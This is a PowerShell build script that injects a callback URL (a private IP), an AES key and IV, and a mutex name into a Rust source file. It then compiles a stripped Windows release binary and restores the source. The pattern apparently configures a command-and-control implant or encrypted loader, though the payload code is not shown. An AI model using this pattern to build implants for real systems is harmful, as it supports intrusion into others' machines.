$url = "192.168.68.73:8080"
$key = "oPqVTb-ieogwPT94"
$iv = "lbzPx4uGUpAx7Wap"
$lock = "3rBoOnIoREn"

(get-content src\main.rs | %{$_ -replace "URL_REPLACE_ME", $url }) | Set-Content src\main.rs
(get-content src\main.rs | %{$_ -replace "AES_KEY", $key }) | Set-Content src\main.rs
(get-content src\main.rs | %{$_ -replace "AES_IV", $iv }) | Set-Content src\main.rs
(get-content src\main.rs | %{$_ -replace "MUTEX_NAME", $lock }) | Set-Content src\main.rs

cargo +nightly build -Z build-std=std,panic_abort -Z build-std-features=panic_immediate_abort --target=x86_64-pc-windows-msvc --release

git restore ./src/main.rs